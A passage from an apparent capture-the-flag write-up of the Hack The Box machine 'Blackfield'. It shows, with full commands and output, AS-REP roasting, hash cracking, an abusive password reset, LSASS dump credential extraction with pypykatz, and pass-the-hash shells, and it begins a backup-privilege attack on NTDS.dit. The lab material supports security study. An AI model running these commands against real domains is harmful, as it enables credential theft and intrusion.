</pre></table></code></div></div><p>So we found three valid usernames:</p><ul><li>audit2020</li><li>support</li><li>svc_backup</li></ul><p>I’ll save these three usernames into a separate file and run <code class="language-plaintext highlighter-rouge">AS-REP roast</code> attack against them</p><h3 id="as-rep-roast-attack">AS-REP Roast Attack</h3><p>AS-REP roasting is a technique that allows retrieving password hashes for users that have <code class="language-plaintext highlighter-rouge">Do not require Kerberos preauthentication</code> property selected. That means that anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password.</p><p>To perform this attack, We’ll use impacket’s <a href="https://github.com/SecureAuthCorp/impacket/blob/impacket_0_9_21/examples/GetNPUsers.py"><strong>GetNPUsers.py</strong></a> which attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set (UF_DONT_REQUIRE_PREAUTH) and generates the Output hash of vulnerable users in John’s crackable format.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.192 BLACKFIELD.local/ <span class="nt">-usersfile</span> valid_users.txt
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span>-] User audit2020 doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:5cebf69cd46e5c7124bcb340d92b1801$fe2339fbcddbb737946c78692f927f65fe699841df68df95ff630c2c19e5cbb6342327946f86567a0740b0324fcf7024c3f8f89501a0ee9d45bb7e84293a9c3d6d4fc946e045631a1327efa9ad4c6ee0b216e79bdf4164327a570300164d2ec5579798af11a1243df6268d22fc83b829e73dae3af87dae2fef68d0ed28fe6dcb0f0e053bcb69d83a2d9e29c5daf0be11124f8c93923203b69d3cd429361eb8d6a3086c760ddf2dd275113bbee480c7329043e32b7c1bef6a3b886164bdd06f721d8199ade901397212eadec5933e9a8e1a154bcd98a5087f2f335fcc474409648aad02842b0a0000eb2e2c396e3bc5043aaa8b6d
[-] User svc_backup doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</pre></table></code></div></div><p>Output obtained shows user <code class="language-plaintext highlighter-rouge">support</code> has UF_DONT_REQUIRE_PREAUTH set and hence we got an hash, next we’ll crack this hash using <code class="language-plaintext highlighter-rouge">john</code> and discover the password is <code class="language-plaintext highlighter-rouge">#00^BlackKnight</code></p><ul><li>Credential <code class="language-plaintext highlighter-rouge">support:#00^BlackKnight</code></li></ul><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ john support.hash  <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="c">#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)</span>
1g 0:00:00:25 DONE <span class="o">(</span>2020-10-05 16:33<span class="o">)</span> 0.03941g/s 565036p/s 565036c/s 565036C/s <span class="c">#1WIF3Y..#*burberry#*1990</span>
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><h2 id="pivoting-support---audit2020">Pivoting: support -&gt; audit2020</h2><p>With the <code class="language-plaintext highlighter-rouge">support</code> user credentials, I ran crackmapexec to enumerate SMB shares to check if we have anything interesting but unfortunately we still don’t have access to forensic share.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ crackmapexec smb <span class="nt">--shares</span> 10.10.10.192 <span class="nt">-u</span> support <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>upport:#00^BlackKnight
SMB         10.10.10.192    445    DC01             <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.192    445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.192    445    DC01             C<span class="nv">$ </span>                             Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.10.192    445    DC01             profiles<span class="nv">$ </span>      READ
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
</pre></table></code></div></div><p>Using crackmapexec to check if <code class="language-plaintext highlighter-rouge">support</code> user has WinRM access:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ crackmapexec winrm 10.10.10.192 <span class="nt">-u</span> support <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span>
WINRM       10.10.10.192    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             <span class="o">[</span>-] BLACKFIELD<span class="se">\s</span>upport:#00^BlackKnight <span class="s2">"Failed to authenticate the user support with ntlm"</span>
</pre></table></code></div></div><h3 id="attack-path-discovery--bloodhound">Attack Path Discovery- BloodHound</h3><p>Next, we use <code class="language-plaintext highlighter-rouge">BloodHound</code>- A Tool For Exploring Active Directory Domain Security which can be installed using <code class="language-plaintext highlighter-rouge">apt-get install bloodhound</code></p><blockquote><p><a href="https://github.com/BloodHoundAD/BloodHound"><strong>BloodHound</strong></a> is an application used to visualize active directory environments. The front-end is built on electron and the back-end is a Neo4j database, the data leveraged is pulled from a series of data collectors also referred to as ingestors which come in PowerShell and C# flavours.</p></blockquote><p>BloodHound ingestor for linux can be installed using <code class="language-plaintext highlighter-rouge">pip3 install bloodhound</code>, after running the ingestor with <code class="language-plaintext highlighter-rouge">support</code> user credentials it connects to Active Directory and downloads computer,domains,groups,user file in .JSON format.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ bloodhound-python <span class="nt">-u</span> support <span class="nt">-p</span> <span class="s1">'#00^BlackKnight'</span> <span class="nt">-ns</span> 10.10.10.192 <span class="nt">-d</span> BLACKFIELD.local <span class="nt">-c</span> all
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 <span class="nb">users
</span>INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 <span class="nb">groups
</span>INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done <span class="k">in </span>00M 39S

cfx:  ~/Documents/htb/blackfield
→ <span class="nb">ls</span> <span class="k">*</span>.json
computers.json  domains.json  groups.json  users.json
</pre></table></code></div></div><p>Before loading the <code class="language-plaintext highlighter-rouge">.json</code> files inside bloodhound we need <code class="language-plaintext highlighter-rouge">neo4j</code> database running.</p><p>To start the <code class="language-plaintext highlighter-rouge">neo4j</code> database we will use the command <code class="language-plaintext highlighter-rouge">neo4j console</code>. On first connect we need to change the default password which can be changed from <a href="http://localhost:7474">http://localhost:7474</a></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ neo4j console
Directories <span class="k">in </span>use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true
</span>2020-10-05 12:02:16.674+0000 INFO  <span class="o">========</span> Neo4j 4.0.7 <span class="o">========</span>
2020-10-05 12:02:16.683+0000 INFO  Starting...
2020-10-05 12:02:23.497+0000 INFO  Bolt enabled on localhost:7687.
2020-10-05 12:02:23.498+0000 INFO  Started.
2020-10-05 12:02:25.735+0000 INFO  Remote interface available at http://localhost:7474/
</pre></table></code></div></div><p>Now that we <code class="language-plaintext highlighter-rouge">neo4j</code> database up and running we can run bloodhound using <code class="language-plaintext highlighter-rouge">bloodhound</code> command and login with our updated neo4j credentials. To load up the .json file we can either use <code class="language-plaintext highlighter-rouge">Upload Data</code> option displayed on extreme right of the screen or just drag and drop the files.</p><p>Once all the files are processed we should the following database info:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blackfield/bloodhound.png" alt="bloodhound" /></p><p>On the search panel we can search for <code class="language-plaintext highlighter-rouge">support</code> user and then click on it to display it’s properties:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blackfield/bloodhound1.png" alt="bloodhound1" /></p><p>As we scroll down the node properties we see there was one item listed under <strong>First Degree Object Control</strong> and as we click on <code class="language-plaintext highlighter-rouge">1</code> we can see that user support has <strong>ForceChangePassword</strong> on <code class="language-plaintext highlighter-rouge">AUDIT2020</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blackfield/bloodhound2.png" alt="bloodhound2" /></p><p>Looking at help of <strong>ForceChangePassword</strong> we understand user <code class="language-plaintext highlighter-rouge">support</code> has privileges to change password of <code class="language-plaintext highlighter-rouge">Audit2020</code> user without knowing the current password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/Blackfield/bloodhound3.png" alt="bloodhound3" /></p><h3 id="password-reset--rpc">Password Reset- RPC</h3><p>I followed this <a href="https://malicious.link/post/2017/reset-ad-user-password-with-linux/"><strong>article</strong></a> to reset AD user password using RPC:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ rpcclient 10.10.10.192 <span class="nt">-U</span> support
Enter WORKGROUP<span class="se">\s</span>upport<span class="s1">'s password:
rpcclient $&gt; setuserinfo2 audit2020 23 '</span>c0ldfx!<span class="s1">'
rpcclient $&gt; exit
</span></pre></table></code></div></div><h3 id="smb-access---audit2020">SMB Access - Audit2020</h3><p>Now that we have changed password for user <code class="language-plaintext highlighter-rouge">audit2020</code> as <code class="language-plaintext highlighter-rouge">c0ldfx!</code>, let’s fire up crackmapexec to confirm these credentials:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ crackmapexec smb 10.10.10.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'c0ldfx!'</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\a</span>udit2020:c0ldfx!

cfx:  ~/Documents/htb/blackfield
→ crackmapexec smb 10.10.10.192 <span class="nt">-u</span> <span class="s1">'audit2020'</span> <span class="nt">-p</span> <span class="s1">'c0ldfx!'</span> <span class="nt">--shares</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\a</span>udit2020:c0ldfx!
SMB         10.10.10.192    445    DC01             <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.192    445    DC01             ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.192    445    DC01             C<span class="nv">$ </span>                             Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.10.192    445    DC01             profiles<span class="nv">$ </span>      READ
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
</pre></table></code></div></div><p>Password reset worked! As user <code class="language-plaintext highlighter-rouge">audit2020</code> we now have access to READ <code class="language-plaintext highlighter-rouge">forensic</code> share.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ smbclient //10.10.10.192/forensic <span class="nt">-U</span> audit2020
Enter WORKGROUP<span class="se">\a</span>udit2020<span class="s1">'s password:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Feb 23 18:33:16 2020
  ..                                  D        0  Sun Feb 23 18:33:16 2020
  commands_output                     D        0  Sun Feb 23 23:44:37 2020
  memory_analysis                     D        0  Fri May 29 01:58:33 2020
  tools                               D        0  Sun Feb 23 19:09:08 2020

                7846143 blocks of size 4096. 3952268 blocks available
</span></pre></table></code></div></div><ul><li>Within <code class="language-plaintext highlighter-rouge">commands_output</code> directory we see output of various command such as netstat, tasklist, systeminfo.</li><li>Inside <code class="language-plaintext highlighter-rouge">tools</code> directorys we see various tools possibly used to conduct audit and forensic analysis.</li><li>Inside <code class="language-plaintext highlighter-rouge">memory_analysis</code> we have multiple memory dumps, the most interesting file stands out is <code class="language-plaintext highlighter-rouge">lsass.zip</code> which is supposed to be the memory capture of LSASS process.</li></ul><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="se">\m</span>emory_analysis
  <span class="nb">.</span>                                   D        0  Fri May 29 01:58:33 2020
  ..                                  D        0  Fri May 29 01:58:33 2020
  conhost.zip                         A 37876530  Fri May 29 01:55:36 2020
  ctfmon.zip                          A 24962333  Fri May 29 01:55:45 2020
  dfsrs.zip                           A 23993305  Fri May 29 01:55:54 2020
  dllhost.zip                         A 18366396  Fri May 29 01:56:04 2020
  ismserv.zip                         A  8810157  Fri May 29 01:56:13 2020
  lsass.zip                           A 41936098  Fri May 29 01:55:08 2020
  mmc.zip                             A 64288607  Fri May 29 01:55:25 2020
  RuntimeBroker.zip                   A 13332174  Fri May 29 01:56:24 2020
  ServerManager.zip                   A 131983313  Fri May 29 01:56:49 2020
  sihost.zip                          A 33141744  Fri May 29 01:57:00 2020
  smartscreen.zip                     A 33756344  Fri May 29 01:57:11 2020
  svchost.zip                         A 14408833  Fri May 29 01:57:19 2020
  taskhostw.zip                       A 34631412  Fri May 29 01:57:30 2020
  winlogon.zip                        A 14255089  Fri May 29 01:57:38 2020
  wlms.zip                            A  4067425  Fri May 29 01:57:44 2020
  WmiPrvSE.zip                        A 18303252  Fri May 29 01:57:53 2020
</pre></table></code></div></div><p>I’ll first mount the share to my machine and copy the <code class="language-plaintext highlighter-rouge">lsass.zip</code> to my folder. Alternatively <code class="language-plaintext highlighter-rouge">mget lsass.zip</code> could also be used to download the file:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ <span class="nb">mkdir</span> /mnt/forensic<span class="p">;</span> mount <span class="nt">-t</span> cifs //10.10.10.192/forensic /mnt/forensic <span class="nt">-o</span> <span class="nv">user</span><span class="o">=</span>audit2020
🔐 Password <span class="k">for </span>audit2020@//10.10.10.192/forensic:  <span class="k">*******</span>

cfx:  /mnt/forensic
→ <span class="nb">cp</span> <span class="nt">-r</span> memory_analysis/ ~/Documents/htb/blackfield/smb/

cfx:  ~/Documents/htb/blackfield/smb/memory_analysis
→ <span class="nb">ls
</span>conhost.zip  dfsrs.zip    ismserv.zip  mmc.zip            ServerManager.zip  smartscreen.zip  taskhostw.zip  wlms.zip
ctfmon.zip   dllhost.zip  lsass.zip    RuntimeBroker.zip  sihost.zip         svchost.zip      winlogon.zip   WmiPrvSE.zip
</pre></table></code></div></div><h3 id="extracting-hashes">Extracting hashes</h3><p>LSASS stands for Local Security Authority Subsystem Service in Windows is used to handle authentication and security policies and stores authentication data in its memory space.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP

cfx:  ~/Documents/htb/blackfield
→ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 <span class="nb">type</span>
</pre></table></code></div></div><p>Basically <code class="language-plaintext highlighter-rouge">Mimikatz</code> is used to extract credentials from lsass dump but on linux we can use <a href="https://github.com/skelsec/pypykatz"><strong>pypykatz</strong></a> a python implemention of Mimikatz.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ pypykatz lsa minidump lsass.DMP
INFO:root:Parsing file lsass.DMP
FILE: <span class="o">========</span> lsass.DMP <span class="o">=======</span>
<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 406458 <span class="o">(</span>633ba<span class="o">)</span>
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        <span class="o">==</span> MSV <span class="o">==</span>
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
<span class="o">[</span>..SNIP..]
<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 153705 <span class="o">(</span>25869<span class="o">)</span>
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        <span class="o">==</span> MSV <span class="o">==</span>
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368

</pre></table></code></div></div><p>Out of all NTLM hashes discovered from lsass DUMP, interesting were <code class="language-plaintext highlighter-rouge">svc_backup</code> and <code class="language-plaintext highlighter-rouge">Administrator</code>, I ran crackmapexec against each of them but unfortunately hash for Administrator didn’t work, probably the password was changed after the dump was generated.</p><h2 id="shell-as-svc_backup">Shell as svc_backup</h2><p>Let’s just quickly check if NTLM hash for <code class="language-plaintext highlighter-rouge">svc_backup</code> works using crackmapexec:</p><p>SMB Works:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ crackmapexec smb 10.10.10.192 <span class="nt">-u</span> svc_backup <span class="nt">-H</span> 9658d1d1dcd9250115e2205d9f48400d
SMB         10.10.10.192    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.192    445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>vc_backup 9658d1d1dcd9250115e2205d9f48400d
</pre></table></code></div></div><p>WinRM works too:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ crackmapexec winrm 10.10.10.192 <span class="nt">-u</span> svc_backup <span class="nt">-H</span> 9658d1d1dcd9250115e2205d9f48400d
WINRM       10.10.10.192    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
WINRM       10.10.10.192    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</pre></table></code></div></div><p>Now that NTLM hash is working for user <code class="language-plaintext highlighter-rouge">svc_backup</code> we can use tools like pth-winexe or impacket suite’s wmiexec, psexec, smbexec or Evil-WinRM which supports NTLM hash authentication.</p><p>Here, we will use <a href="https://github.com/Hackplayers/evil-winrm"><strong>Evil-WinRM</strong></a> tool since it provides easier upload/download functionality.</p><p>We get the shell as <code class="language-plaintext highlighter-rouge">svc_backup</code>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/blackfield
→ evil-winrm <span class="nt">-i</span> 10.10.10.192 <span class="nt">-u</span> svc_backup <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>blackfield<span class="se">\s</span>vc_backup
</pre></table></code></div></div><p>Grabbing <code class="language-plaintext highlighter-rouge">user.txt</code>:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop&gt; <span class="nb">ls


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-ar---</span>        10/3/2020   3:31 PM             34 user.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop&gt; Get-content user.txt
9a87f83707e7e9b<span class="k">*****************</span>

</pre></table></code></div></div><h2 id="elevating-privilege-svc_backup---administrator">Elevating Privilege svc_backup -&gt; Administrator</h2><h3 id="enumeration">Enumeration</h3><p>Looking at the privileges of our user we find <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> &amp; <code class="language-plaintext highlighter-rouge">SeRestorePrivilege</code> which are very powerful privileges that allows the user to access directories/files that he doesn’t own or doesn’t have permission to.</p><blockquote><p>This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.</p></blockquote><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</pre></table></code></div></div><p>The user <code class="language-plaintext highlighter-rouge">svc_backup</code> is a member of <strong>Backup Operators</strong> Groups and hence has the <strong>Backup privileges</strong> which allows him to backup and restore files on the system, read and write files on the system.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; net user svc_backup
User name                    svc_backup
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2020 11:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
</span></pre></table></code></div></div><h3 id="attack-scenario">Attack Scenario</h3><ul><li>Grab a copy of <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file, a database that stores Active Directory users credentials.</li><li>Next, we will grab SYSTEM hive file which contains System boot key essential to decrypt the NTDS.dit</li><li>Using Impacket’s secretsdump script to extract NTLM hashes of all the users in the domain from NTDS.dit</li></ul><h2 id="privesc-method-1---wbadmin">PrivEsc Method #1 - wbadmin</h2><p>For the first method, We will use <code class="language-plaintext highlighter-rouge">wbadmin</code> a Windows command line tool which enables us back up and restore operating system, volumes, files, folders, and applications.</p><p>It is not recommended to Backup and Restore the file in the same disk, So first we will first create a shadow copy of disk and backup the <code class="language-plaintext highlighter-rouge">ntds.dit</code> from the <code class="language-plaintext highlighter-rouge">c:\windows\ntds\ntds.dit</code> and store it inside SMB share <code class="language-plaintext highlighter-rouge">C$</code></p><p>We could also achieve this by hosting our own SMB share from our machine but I preferred using SMB 